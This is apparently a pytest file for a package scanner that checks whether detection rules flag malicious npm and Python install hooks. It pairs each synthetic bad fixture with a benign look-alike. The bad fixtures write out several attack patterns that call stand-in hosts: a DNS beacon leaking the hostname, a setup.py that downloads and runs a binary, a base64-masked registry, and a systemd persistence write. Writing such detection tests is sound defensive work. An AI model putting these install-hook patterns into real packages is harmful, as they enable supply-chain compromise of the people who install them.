"""Install-time payload rules: each attack is paired with an honest look-alike that stays clean."""

from __future__ import annotations

import json
from pathlib import Path

from skilltotal import engine
from skilltotal.collector import detect_component

BANNER = "FIXTURE ONLY - synthetic detection test sample, not real malware"


def _ids(root: Path) -> set[str]:
    report = engine.analyze_directory(root, detect_component(root, source=str(root)))
    for f in report.findings:
        assert f.evidence
    return {f.id for f in report.findings}


def _pkg(root: Path, scripts: dict[str, str]) -> None:
    root.mkdir(parents=True, exist_ok=True)
    (root / "package.json").write_text(
        json.dumps({"name": "fixture", "version": "1.0.0", "description": BANNER,
                    "scripts": scripts})
    )


def test_masked_registry(tmp_path: Path) -> None:
    bad = tmp_path / "bad"
    _pkg(bad, {"postinstall": "node setup.js"})
    (bad / "setup.js").write_text(
        f"// {BANNER}\nconst {{ execSync }} = require('child_process');\n"
        "const url = Buffer.from('ZWNobw==', 'base64').toString();\n"
        "execSync('npm install other-pkg --registry ' + url);\n"
    )
    assert "ST-INSTALL-NPM-MASKED-REGISTRY" in _ids(bad)
    ok = tmp_path / "ok"
    _pkg(ok, {"postinstall": "node setup.js"})
    (ok / "setup.js").write_text(
        f"// {BANNER}\nconst {{ execSync }} = require('child_process');\n"
        "execSync('npm install other-pkg --registry https://registry.example.test/');\n"
    )
    assert "ST-INSTALL-NPM-MASKED-REGISTRY" not in _ids(ok)


def test_dns_beacon(tmp_path: Path) -> None:
    bad = tmp_path / "bad"
    dns_call = "require('dns').lookup(require('os').hostname()+'.oob.example.invalid',()=>{})"
    _pkg(bad, {"postinstall": f'node -e "{dns_call}"'})
    assert "ST-INSTALL-NPM-DNS-BEACON" in _ids(bad)
    ok = tmp_path / "ok"
    _pkg(ok, {"postinstall": "node -e \"console.log(require('os').hostname())\""})
    assert "ST-INSTALL-NPM-DNS-BEACON" not in _ids(ok)
    fixed = tmp_path / "fixed"
    _pkg(fixed, {"postinstall": "node -e \"require('dns').lookup('a.example.test',()=>{})\""})
    assert "ST-INSTALL-NPM-DNS-BEACON" not in _ids(fixed)


def test_shell_runs_js(tmp_path: Path) -> None:
    bad = tmp_path / "bad"
    _pkg(bad, {"preinstall": "sh ./prepare.js"})
    (bad / "prepare.js").write_text(
        f"# {BANNER}\n/*\n$(echo fixture-only)\n*/\nconsole.log('hello world');\n"
    )
    assert "ST-INSTALL-NPM-SHELL-RUNS-JS" in _ids(bad)
    ok = tmp_path / "ok"
    _pkg(ok, {"preinstall": "sh ./prepare.sh", "postinstall": "bash -c \"node setup.js\""})
    assert "ST-INSTALL-NPM-SHELL-RUNS-JS" not in _ids(ok)


def test_service_token_watch(tmp_path: Path) -> None:
    bad = tmp_path / "bad"
    _pkg(bad, {"postinstall": "node install.js"})
    (bad / "install.js").write_text(
        f"// {BANNER}\nconst fs = require('fs');\nconst dir = home + '/.config/systemd/user';\n"
        "fs.writeFileSync(dir + '/w.service', '[Service]');\n"
        "const check = 'curl -H \"Authorization: token $T\" https://api.example.test/u # 401';\n"
    )
    assert "ST-INSTALL-NPM-SERVICE-TOKEN-WATCH" in _ids(bad)
    ok = tmp_path / "ok"
    _pkg(ok, {"postinstall": "node install.js"})
    (ok / "install.js").write_text(
        f"// {BANNER}\nconst fs = require('fs');\nconst dir = home + '/Library/LaunchAgents';\n"
        "fs.writeFileSync(dir + '/helper.plist', '<plist/>');\n"
    )
    assert "ST-INSTALL-NPM-SERVICE-TOKEN-WATCH" not in _ids(ok)


def test_py_download_exec(tmp_path: Path) -> None:
    bad = tmp_path / "bad"
    bad.mkdir()
    (bad / "setup.py").write_text(
        f"# {BANNER}\nimport subprocess, urllib.request\nfrom setuptools import setup\n"
        "urllib.request.urlretrieve('https://cdn.example.invalid/a.bin', '/tmp/a.bin')\n"
        "subprocess.Popen(['/tmp/a.bin'])\nsetup(name='x')\n"
    )
    assert "ST-INSTALL-PY-DOWNLOAD-EXEC" in _ids(bad)
    ok = tmp_path / "ok"
    ok.mkdir()
    (ok / "setup.py").write_text(
        f"# {BANNER}\nimport subprocess, urllib.request\nfrom setuptools import setup\n"
        "urllib.request.urlretrieve('https://data.example.test/w.tgz', '/tmp/w.tgz')\n"
        "subprocess.run(['tar', 'xf', '/tmp/w.tgz'])\nsetup(name='x')\n"
    )
    assert "ST-INSTALL-PY-DOWNLOAD-EXEC" not in _ids(ok)
